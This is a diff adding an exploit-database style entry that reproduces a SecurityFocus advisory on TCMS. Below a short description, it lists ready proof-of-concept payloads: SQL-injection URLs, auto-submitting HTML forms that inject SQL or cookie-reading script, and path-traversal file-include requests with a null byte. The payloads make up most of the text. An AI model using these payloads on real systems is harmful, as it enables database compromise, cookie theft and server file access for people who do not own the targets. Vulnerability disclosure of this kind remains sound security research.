@@ -1,0 +1,53 @@
+source: http://www.securityfocus.com/bid/42766/info
+
+TCMS is prone to multiple input-validation vulnerabilities, including a local file-include vulnerability, a local file-disclosure vulnerability, multiple SQL-injection vulnerabilities, and multiple cross-site scripting vulnerabilities.
+
+An attacker can exploit these vulnerabilities to steal cookie-based authentication credentials, compromise the application, access or modify data, exploit latent vulnerabilities in the underlying database, obtain potentially sensitive information, or execute arbitrary local scripts in the context of the webserver process; other attacks are also possible. 
+
+http://www.example.com/www/index.php?admin=1&section=content&action=edit&id=PAGE_ID'+ANY_SQL
+http://www.example.com/www/index.php?template=home&content=home'+ANY_SQL
+http://www.example.com/www/index.php?template=forum&action=showReplies&index=1'+ANY_SQL_CODE
+http://www.example.com/www/index.php?template=blog&id=1'+ANY_SQL_CODE
+
+<form action="http://www.example.com/www/index.php" method="post" name="main" >
+
+<input type="hidden" name="template" value="3" />
+<input type="hidden" name="language" value="1" />
+<input type="hidden" name="name" value="home" />
+<input type="hidden" name="note" value='The note text' />
+<input type="hidden" name="value" value="page content" />
+<input type="hidden" name="admin" value="1" />
+<input type="hidden" name="text" value="1" />
+<input type="hidden" name="section" value="content" />
+<input type="hidden" name="id" value="9'+ANY_SQL_CODE" />
+<input type="hidden" name="action" value="Save text" />
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+
+<form action="http://www.example.com/www/index.php" method="post" name="main" >
+
+<input type="hidden" name="template" value="3" />
+<input type="hidden" name="language" value="1" />
+<input type="hidden" name="name" value="home" />
+<input type="hidden" name="note" value='The note text"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="value" value="page content" />
+<input type="hidden" name="admin" value="1" />
+<input type="hidden" name="text" value="1" />
+<input type="hidden" name="section" value="content" />
+<input type="hidden" name="id" value="9" />
+<input type="hidden" name="action" value="Save text" />
+
+http://www.example.com/www/index.php?admin=1&section=language"><script>alert(document.cookie)</script>&action=addLanguage
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+http://www.example.com/www/index.php?template=./../../../../../../../tmp/test.php%00
+
+http://www.example.com/www/index.php?admin=1&section=style&action=editStylesheet&name=./../../../../../../../tmp/test.php
